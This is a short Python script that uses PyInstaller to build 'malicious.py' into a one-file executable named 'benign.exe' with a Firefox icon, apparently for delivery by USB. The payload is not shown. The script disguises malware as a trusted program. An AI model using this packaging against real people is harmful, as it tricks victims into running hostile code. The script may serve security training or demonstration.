import PyInstaller.__main__
import os
import shutil

filename='malicious.py'
exename='benign.exe'
icon='FireFox.ico'
pwd=os.getcwd()
usbdir=os.path.join(pwd,"USB")

if os.path.isfile(exename):
    os.remove(exename)

PyInstaller.__main__.run([
    'malicious.py',
    '--onefile',
    '--clean',
    '--log-level=ERROR',
    '--name='+exename,
    '--icon='+icon
])

shutil.move(os.path.join(pwd,'dist',exename),pwd)
shutil.rmtree('dist')
shutil.rmtree('build')
#shutil.rmtree('__pycache__')
os.remove(exename+'.spec')